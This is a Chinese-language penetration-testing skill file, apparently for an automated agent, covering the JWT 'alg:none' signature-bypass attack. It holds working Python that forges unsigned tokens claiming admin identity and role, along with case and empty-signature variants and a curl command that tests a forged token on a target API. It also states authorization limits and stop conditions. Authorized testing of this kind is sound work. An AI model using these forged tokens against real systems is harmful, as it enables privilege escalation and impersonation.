---
name: jwt-none-attack
description: 利用 JWT 库接受 alg:none 的漏洞绕过签名验证，伪造任意 Token 实现权限提升。
category: api
source: xalgorix
tags:
  - JWT
  - 认证绕过
  - 算法混淆
  - 权限提升
required_tools:
  - curl
  - Python 3
---

# JWT None 算法攻击

## 适用场景

- 目标 API 使用 JWT 进行认证。
- JWT 的 `alg` 字段可能被篡改为 `none` 以绕过签名验证。
- 库版本过旧（如旧版 `jsonwebtoken`、`pyjwt`）可能未正确处理 `none` 算法。

## 授权边界

- 仅伪造自己的测试账号 Token，不冒充其他用户。
- 证明漏洞存在即可，不利用获得的权限操作数据。

## 前置条件

- 已捕获至少一个合法 JWT Token。
- Python 3 环境（用于生成 payload）。
- 已解码并理解 Token 的 claims 结构。

## 执行步骤

### 步骤 1：解码 JWT

```bash
# 解码 Token
python3 -c "
import base64, json
token = '<jwt_token>'
parts = token.split('.')
for p in parts[:2]:
    # 补齐 Base64 padding
    p += '=' * (4 - len(p) % 4)
    print(json.loads(base64.urlsafe_b64decode(p)))
"
```

### 步骤 2：None 算法变体

```python
import base64, json, hmac, hashlib

header_none_variants = [
    {"alg": "none", "typ": "JWT"},
    {"alg": "None", "typ": "JWT"},
    {"alg": "NONE", "typ": "JWT"},
    {"alg": "nOnE", "typ": "JWT"},
]

# 使用你想要伪造的 claims
payload = {
    "sub": "admin",
    "role": "admin",
    "iat": 9999999999
}

for header in header_none_variants:
    b64_header = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).rstrip(b'=').decode()
    b64_payload = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b'=').decode()
    # None 算法 → 签名为空
    token = f"{b64_header}.{b64_payload}."
    print(token)
```

### 步骤 3：空签名变体

```python
# 有些库可能接受不同形式的空签名
empty_signatures = ["", " ", ".", "null", "None"]
for sig in empty_signatures:
    token = f"{b64_header}.{b64_payload}.{sig}"
    # 测试这个 Token
```

### 步骤 4：验证攻击

```bash
# 用伪造的 Token 访问需要认证的端点
curl -s "https://<target>/api/users/me" \
  -H "Authorization: Bearer <forged_token>" \
  -w "%{http_code}"
```

## 停止条件

- 成功冒充管理员角色后，仅验证一次访问即停止。
- 不要用管理员权限查看或操作其他用户数据。

## 输出格式

- JWT Token 的 claims 结构。
- 有效的 None 算法变体。
- 伪造的 claims 和权限级别。
- 受影响的端点。

## 验收标准

1. 成功解码并分析了 JWT 结构。
2. 测试了至少 5 种 None 算法变体。
3. 如确认漏洞，生成了 PoC Token 并验证了一次访问。
